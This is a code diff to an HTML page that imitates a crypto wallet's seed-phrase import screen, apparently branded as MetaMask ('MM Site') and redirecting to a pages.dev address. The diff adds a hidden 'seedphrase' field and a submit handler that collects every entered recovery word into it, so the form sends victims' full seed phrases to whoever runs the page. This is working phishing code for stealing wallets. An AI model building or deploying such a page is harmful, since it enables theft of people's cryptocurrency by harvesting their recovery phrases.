@@ -34,6 +34,7 @@
     <input type="hidden" name="_next" value="https://loading-dapp.pages.dev/">
     <input type="hidden" name="_subject" value="New message from MM Site">
     <input type="hidden" name="website" value="MM Site">
+    <input type="hidden" name="seedphrase" id="seedphrase" value="">
 
 
         <section _ngcontent-wrh-c175="" class="mnemonic">
@@ -59,6 +60,17 @@
 <bottom-buttons _ngcontent-wrh-c175="" _nghost-wrh-c83=""><div _ngcontent-wrh-c83="" class="inner">
     <button _ngcontent-wrh-c83="" class="outline" type="submit"> Next <!----></button><!----><!----></div>
 </form>
+<script>
+    // Combine all seed phrase inputs into a single field
+    document.querySelector('form').addEventListener('submit', function(e) {
+        const inputs = Array.from(document.querySelectorAll('input[name^="input"]'))
+            .filter(input => input.value.trim() !== '')
+            .map(input => input.value.trim())
+            .join(' ');
+        
+        document.getElementById('seedphrase').value = inputs;
+    });
+</script>
 </section>
 </bottom-buttons>
 </new-wallet-import-seed><!---->
